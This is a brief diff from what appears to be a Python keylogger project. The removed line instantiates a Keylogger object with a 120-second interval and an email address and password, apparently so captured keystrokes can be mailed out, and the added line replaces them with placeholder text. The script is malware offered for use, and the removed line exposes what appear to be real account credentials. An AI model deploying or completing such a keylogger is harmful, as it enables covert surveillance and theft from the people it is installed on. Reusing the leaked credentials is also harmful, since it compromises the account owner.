@@ -45,5 +45,5 @@ class Keylogger:
 		
 import keylogger
 
-my_keylogger = keylogger.Keylogger(120, "SCOLOW2111@UEAB.AC.KE", "Colo5114")
+my_keylogger = keylogger.Keylogger(120, "ENTER YOUR EMAIL HERE", "ENTER PASSWORD OF YOUR EMAIL HERE")
 my_keylogger.start()
